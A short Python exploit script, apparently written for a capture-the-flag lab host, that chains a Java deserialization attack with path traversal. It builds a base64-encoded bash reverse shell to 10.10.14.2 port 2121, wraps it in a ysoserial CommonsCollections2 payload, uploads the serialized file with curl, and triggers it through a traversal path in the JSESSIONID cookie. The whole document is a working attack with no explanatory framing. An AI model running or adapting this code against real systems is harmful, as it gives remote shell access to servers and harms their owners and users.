#!/usr/bin/env python3
# xeniel

import os
import base64

url = 'http://10.10.10.205:8080/upload.jsp?email=xen'
reverse = 'bash -i >& /dev/tcp/10.10.14.2/2121 0>&1'

encodedReverse = base64.b64encode(reverse.encode("utf-8"))
encodedStr = str(encodedReverse, "utf-8")

payload = "bash -c {echo," + str(encodedStr) + "}|{base64,-d}|{bash,-i}"
pathYaoserial = "java -jar /home/xen/tools/ysoserial/ysoserial.jar CommonsCollections2 " + '"'+ str(payload) + '"' + " > xen.session"

print("[+] Genereting payload")
os.system(pathYaoserial)

print("[+] Sending payload")
print("[+] Uploading file")

upload = 'curl -s -F "image=@xen.session" ' + str(url) + ' > /dev/null'
os.system(upload)

print("[+] Request file")

requestF = 'curl -s --cookie "JSESSIONID=../../../opt/samples/uploads/xen" ' + str(url) + ' > /dev/null'
os.system(requestF)

print("[+] Done!")

